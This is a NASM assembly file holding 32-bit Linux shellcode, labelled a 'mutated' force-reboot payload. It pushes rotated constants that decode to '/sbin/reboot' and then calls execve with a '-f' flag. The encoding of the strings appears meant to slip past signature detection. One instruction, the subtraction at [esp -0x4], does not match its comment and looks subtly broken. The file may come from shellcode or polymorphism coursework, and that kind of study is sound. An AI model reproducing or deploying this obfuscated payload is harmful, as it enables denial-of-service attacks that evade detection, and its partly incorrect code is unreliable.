; File: shellcode_1_force_reboot_mutated.nasm
; Author: Petr Javorik

global _start

section .text

_start:

    xor edx, edx
    push edx
    push 0xe8dedec4             ; 0xe8dedec4 bitwise shift -1 is 0x746f6f62
    ror dword [esp], 1          ; shift back to 0x746f6f62
    push 0xcae45edc             ; 0xcae45edc bitwise shift -1 is 0x65722f6e
    ror dword [esp], 1          ; shift back to 0x65722f6e
    push 0xd2c4e65e             ; 0xd2c4e65e bitwise shift -1 is 0x6962732f
    ror dword [esp], 1          ; shift back to 0x6962732f
    mov ebx,esp
    push edx
    push word 0x805c            ; 0x805C - 0x1a2f = 0x662d
    sub word [esp -0x4], 0x1a2f ; 0x805C - 0x1a2f = 0x662d
    mov edi, esp                ; change esi to edi
    push edx
    push edi                    ; change esi to edi
    push ebx
    mov ecx, esp
    mov eax, edx                ; added instruction
    mov al, 0xb
    int 0x80
